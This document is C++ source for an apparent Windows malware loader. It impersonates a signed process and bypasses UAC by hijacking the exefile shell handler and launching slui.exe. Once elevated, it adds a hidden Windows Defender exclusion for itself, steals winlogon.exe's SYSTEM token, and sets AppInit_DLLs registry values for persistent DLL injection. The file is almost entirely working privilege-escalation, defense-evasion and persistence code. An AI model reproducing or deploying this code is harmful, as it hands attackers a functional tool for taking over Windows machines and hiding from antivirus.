#include "privesc.h"
#include "process_steal.h"
#include <shellapi.h>

using namespace std;

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     LPSTR lpCmdLine, int nCmdShow) {
  if (!IsUserAnAdmin()) {
    if (!InitNtdll()) {
      fprintf(stderr, "[-] Failed to resolve NtQueryInformationProcess.\n");
      return 1;
    }

    // Pick a random signed process to masquerade as.
    SignedProcessInfo target = PickRandomSignedProcess();
    if (target.pid == 0) {
      fprintf(stderr, "[-] No signed process found to impersonate.\n");
      return 1;
    }
    printf("[+] Selected process: %ls (PID %lu)\n\n", target.exeName.c_str(), target.pid);

    // Read info from the target.
    ProcessStrings info;
    if (!ReadRemoteProcessStrings(target.pid, info)) {
      fprintf(stderr, "[-] Failed to read process strings.\n");
      return 1;
    }

    printf("[*] Read from target process:\n");
    printf("    CommandLine   : %ls\n", info.commandLine.c_str());
    printf("    ImagePathName : %ls\n", info.imagePathName.c_str());
    printf("    WindowTitle   : %ls\n\n", info.windowTitle.c_str());
    fflush(stdout);

    // Apply to ourselves.
    ApplyToCurrentProcess(info);
  
    // Create Class "exefile" in HKCU
    // HKEY_CURRENT_USER
    //   Software
    //     Classes
    //       exefile
    //         shell
    //           open
    //             command
    //               @=Payload

    // Create registry tree
    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile",
                      L"shell");
    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell",
                      L"open");
    CreateRegistryKey(HKEY_CURRENT_USER,
                      L"Software\\Classes\\exefile\\shell\\open", L"command");

    SetRegistryValue(HKEY_CURRENT_USER,
                     L"Software\\Classes\\exefile\\shell\\open\\command", L"",
                     GetCurrentFile());

    // Start slui.exe with "runas" verb
    ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL,
                  NULL, SW_SHOWNORMAL);
    Sleep(1000);
  } else {
    if (IsDefenderRunning()) {
      // make window defender ignore this file at all cost
      wstring filename = GetCurrentFile();
      wstring sep = L"'";
      wstring command =
          L"Add-MpPreference -ExclusionPath " + sep + filename + sep;
      ShellExecuteW(NULL, L"runas", L"powershell.exe", command.c_str(), NULL,
                    SW_HIDE);
      // done
    }

    if (!SetPrivilege(SE_DEBUG_NAME))
      return -1;
    DWORD pid = GetPIDByName("winlogon.exe");
    HANDLE cToken = GetToken(pid);
    LPCWSTR processes[] = {
        L"C:\\Windows\\System32\\reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows "
        L"NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_EXPAND_SZ /d "
        L"C:%HOMEPATH%\\AppInit_DLLs.dll /f",
        L"C:\\Windows\\System32\\reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows "
        L"NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 1 "
        L"/f",
    };
    int len = sizeof(processes) / sizeof(processes[0]);
    for (int i = 0; i < len; i++) {
      if (!CreateElevatedProcess(cToken, (LPWSTR)processes[i]))
        return -1;
    }
    DeleteRegistryKey(HKEY_CURRENT_USER,
                      L"Software\\Classes\\exefile\\shell\\open", L"command");
    DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell",
                      L"open");
  }
  // Delete registry keys, but only from \Software\Classes\exefile\shell to not
  // interfere with other application handlers

  return 0;
}
// x86_64-w64-mingw32-g++ --static script.cpp -o main.exe
// -mwindows